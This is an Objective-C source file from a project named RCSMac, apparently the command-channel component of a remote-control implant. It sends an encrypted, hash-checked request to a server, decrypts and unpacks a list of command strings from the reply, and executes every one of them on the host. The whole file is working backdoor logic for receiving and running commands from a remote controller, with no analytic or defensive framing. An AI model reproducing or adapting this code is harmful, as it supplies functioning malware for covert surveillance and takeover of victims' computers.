//
//  CommandsNetworkOperation.m
//  RCSMac
//
//  Created by armored on 1/29/13.
//
//

#import "RCSICommon.h"

#import "CommandsNetworkOperation.h"

#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSITaskManager.h"
#import "RCSILogManager.h"

#import "RCSILogger.h"
#import "RCSIDebug.h"

@implementation CommandsNetworkOperation

@synthesize mCommands;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
  {
    mTransport = aTransport;
    mCommands = [[NSMutableArray alloc] init];
    
    return self;
  }
  
  return nil;
}

- (void)dealloc
{
  [mCommands release];
  [super dealloc];
}

- (BOOL)perform
{
   
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int32_t i = 0;
  uint32_t command = PROTO_COMMANDS;
  
  
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
  {    
    [commandData release];
    [outerPool release];
    
    return NO;
  }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];

  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  @try
  {    
    shaRemote = [replyDecrypted subdataWithRange:
                 NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                             CC_SHA1_DIGEST_LENGTH)];

    
    shaLocal = [replyDecrypted subdataWithRange:
                NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
  }
  @catch (NSException *e)
  {    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    return NO;
  }
  
  shaLocal = [shaLocal sha1Hash];

  if ([shaRemote isEqualToData: shaLocal] == NO)
  {   
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    return NO;
  }
  
  if (command != PROTO_OK)
  {
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    return NO;
  }
  
  uint32_t numOfStrings = 0;
  @try
  {
    [replyDecrypted getBytes: &numOfStrings
                       range: NSMakeRange(8, sizeof(uint32_t))];
  }
  @catch (NSException *e)
  {    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    return NO;
  }
  
  
  if (numOfStrings == 0)
  {
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    return NO;
  }

  uint32_t stringDataSize = 0;
  NSMutableData *strings;
  @try
  {
    [replyDecrypted getBytes: &stringDataSize
                       range: NSMakeRange(4, sizeof(uint32_t))];
    
    strings = [NSMutableData dataWithData:
               [replyDecrypted subdataWithRange: NSMakeRange(12, stringDataSize)]];
  }
  @catch (NSException *e)
  {
    return NO;
  }
  
  uint32_t len = 0;
  
  //
  // Unpascalize n NULL terminated UTF16LE strings
  //
  NSData *stringData;
  
  for (i = 0; i < numOfStrings; i++)
  {
    [strings getBytes: &len length: sizeof(uint32_t)];
    @try
    {
      stringData  = [strings subdataWithRange: NSMakeRange(0, len + 4)];
    }
    @catch (NSException *e)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
    
    NSString *string = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
    
    if (string == nil)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
    
    [mCommands addObject: string];
    
    @try
    {
      [strings replaceBytesInRange: NSMakeRange(0, len + 4)
                         withBytes: NULL
                            length: 0];
    }
    @catch (NSException *e)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  }

  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

- (BOOL)executeCommands
{
  for (int i=0; i < [mCommands count]; i++)
  {
    NSString *tmpCmd = [mCommands objectAtIndex:i];
    
    _i_Task *tsk = [[_i_Task alloc] init];
    
    [tsk performCommand:tmpCmd];
    
    [tsk release];
  }
  
  return TRUE;
}
@end
